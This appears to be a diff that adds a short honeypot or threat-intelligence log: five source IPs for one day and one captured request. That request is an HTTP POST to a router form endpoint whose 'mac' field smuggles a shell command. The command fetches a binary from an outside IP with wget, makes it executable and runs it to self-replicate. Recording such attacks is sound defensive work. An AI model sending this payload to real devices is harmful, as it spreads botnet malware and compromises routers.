@@ -1,0 +1,13 @@
+Top 5 IPs for 2023-11-20:
+60.154.87.110
+106.111.34.223
+103.7.27.90
+110.182.248.177
+113.221.78.67
+
+
+
+Malicious commands seen:
+POST /goform/set_LimitClient_cfg HTTP/1.1
+Cookie: user=admin
+time1=00:00-00:00&time2=00:00-00:00&mac=;wget http://2.56.247.167/vbot.mpsl; chmod 777 vbot.mpsl; ./vbot.mpsl lblink.selfrep;
